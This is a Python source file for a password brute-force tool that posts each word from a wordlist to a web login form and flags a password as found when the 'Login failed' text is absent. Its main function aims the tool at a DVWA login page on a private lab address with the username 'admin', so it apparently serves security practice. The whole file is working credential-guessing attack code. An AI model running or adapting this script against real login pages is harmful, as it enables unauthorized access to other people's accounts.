import time
from important_static_functions import *

CREDS_FOUND = False


def proper_response(url, data, verification, word, number, verbose):
    global CREDS_FOUND
    try:
        response = brute_force_request(url, data=data, timeout=5)
    except requests.exceptions.ConnectionError:
        print(colored('[-] Hosts seems to be down. Please Verify connection with the host.', 'red'))
        sys.exit(0)
    if verbose is not None:
        if verification not in response.content.decode('utf-8'):
            print(colored(f'[+] Working On {number}\t\tPassword Found "{word}"', 'blue'))
            CREDS_FOUND = True
        else:
            print(colored(f'[-] Working On {number}\t\tPassword Invalid "{word}"', 'red'))
    else:
        if verification not in response.content.decode('utf-8'):
            print(colored(f'[+] Password Number {number} in given wordlist\t\tPassword Found "{word}"', 'blue'))
            CREDS_FOUND = True


def brute_force(url, username, username_field, password_field, submit_field_name, verification, word_queue,
                verbose=None):
    number = 1
    words = word_queue.readlines()
    for word in words:
        word = word.strip()
        data = {
            username_field: username,
            password_field: word,
            submit_field_name: 'submit'
        }
        if not CREDS_FOUND:
            proper_response(url, data, verification, word, number, verbose, )
        number += 1

def main():
    start_time = time.time()
    brute_force('http://192.168.56.101/dvwa/login.php', 'admin', 'username', 'password', 'Login',
                'Login failed', open('../../../wordlist/passwords1.txt'), verbose=True)
    ending_time = time.time()
    print(f'Total Time {ending_time - start_time}')


if __name__ == '__main__':
    # python start.py -l admin -p passwords.txt -u http://192.168.56.101/dvwa/login.php -v "Login failed"
    main()
